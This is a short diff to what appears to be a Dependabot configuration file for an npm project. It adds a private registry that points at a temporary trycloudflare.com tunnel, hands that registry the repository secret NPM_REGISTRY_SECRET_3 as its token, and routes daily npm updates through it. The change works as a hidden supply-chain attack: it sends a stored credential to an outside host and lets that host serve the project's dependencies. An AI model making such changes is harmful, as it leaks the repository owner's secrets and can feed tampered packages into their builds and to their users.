@@ -1,7 +1,13 @@
 version: 2
+registries:
+  npm-redirect-test:
+    type: npm-registry
+    url: https://flow-talk-view-celebrity.trycloudflare.com
+    token: ${{secrets.NPM_REGISTRY_SECRET_3}}
 updates:
   - package-ecosystem: npm
     directory: /
     schedule:
       interval: daily
-# trigger 1786043259
+    registries:
+      - npm-redirect-test
